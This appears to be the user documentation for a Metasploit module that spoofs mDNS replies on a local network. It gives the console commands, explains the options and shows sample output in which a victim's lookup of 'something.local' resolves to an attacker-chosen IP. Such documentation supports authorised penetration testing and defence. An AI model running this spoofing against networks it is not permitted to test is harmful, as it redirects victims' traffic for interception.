This module will listen for mDNS multicast requests on 5353/udp for A and AAAA record queries, and respond with a spoofed IP address (assuming the request matches our regex).

## Vulnerable Application

To use mdns_response, be on a network with devices/applications that can make mDNS multicast requests on 5353/udp for A and AAAA record queries.

## Verification Steps

  1. `use auxiliary/spoof/mdns/mdns_response`
  2. `set INTERFACE network_iface`
  3. `set SPOOFIP4 10.x.x.x`
  4. `run`

## Options
  
**The SPOOFIP4 option**

IPv4 address with which to spoof A-record queries
	
```
set SPOOFIP4 [IPv4 address]
```

**The SPOOFIP6 option**

IPv6 address with which to spoof AAAA-record queries
	
```
set SPOOFIP6 [IPv6 address]
```

**The REGEX option**

Regex applied to the mDNS to determine if spoofed reply is sent
	
```
set REGEX [regex]
```

**The TTL option**

Time To Live for the spoofed response (in seconds)
	
```
set TTL [number of seconds]
```

## Scenarios

```
msf > use auxiliary/spoof/mdns/mdns_response
msf auxiliary(mdns_response) > set SPOOFIP4 10.x.x.y
SPOOFIP4 => 10.x.x.y
msf auxiliary(mdns_response) > set INTERFACE en3
INTERFACE => en3
msf auxiliary(mdns_response) > run
[*] Auxiliary module execution completed
msf auxiliary(mdns_response) >
[*] mDNS spoofer started. Listening for mDNS requests with REGEX "(?-mix:.*)" ...
```

On Victim Machine
```
ping something.local
```
(IP address should resolve to spoofed address)


```
[+] 10.x.x.z        mDNS - something.local. matches regex, responding with 10.x.x.y
```
